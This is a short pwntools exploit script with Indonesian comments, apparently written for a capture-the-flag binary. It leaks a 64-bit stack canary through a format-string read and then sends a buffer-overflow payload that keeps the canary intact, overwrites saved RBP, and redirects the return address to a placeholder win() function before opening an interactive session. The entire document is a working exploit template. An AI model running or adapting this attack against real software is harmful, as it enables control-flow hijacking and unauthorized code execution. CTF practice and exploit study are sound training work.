from pwn import *

# === CONFIGURATION ===
context.arch = 'amd64' # Set arsitektur ke 64-bit
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    # Masukkan IP dan Port dari server CTF
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Leak Canary via Format String ---
# Di 64-bit, offset canary biasanya berbeda (misal: %15$p)
# Kamu harus cek manual di GDB atau kirim banyak %p.%p.%p...
p.recvuntil(b'Name: ')
p.sendline(b'%15$p') 

# Ambil output dan ubah ke integer (8 byte/64-bit)
leaked_output = p.recvline()
canary = int(leaked_output.strip(), 16)

log.success(f"Canary Leaked: {hex(canary)}")

# --- LANGKAH 2: Susun Payload Buffer Overflow ---
# Urutan: [Buffer] + [Canary] + [RBP] + [Ret Addr]
# - Offset ke canary (misal 40 byte, cari pakai cyclic/GDB)
# - RBP di 64-bit berukuran 8 byte
# - Target address (misal fungsi win atau shellcode)

target_addr = 0x400600 # Contoh alamat win() 64-bit

payload = b'A' * 40          # 1. Isi buffer sampai batas canary
payload += p64(canary)       # 2. Masukkan canary (8 byte)
payload += b'B' * 8          # 3. Timpa Saved RBP (8 byte)
payload += p64(target_addr)  # 4. Timpa Return Address (8 byte)

# --- LANGKAH 3: Kirim Payload Final ---
p.recvuntil(b'Input: ')
p.sendline(payload)

p.interactive()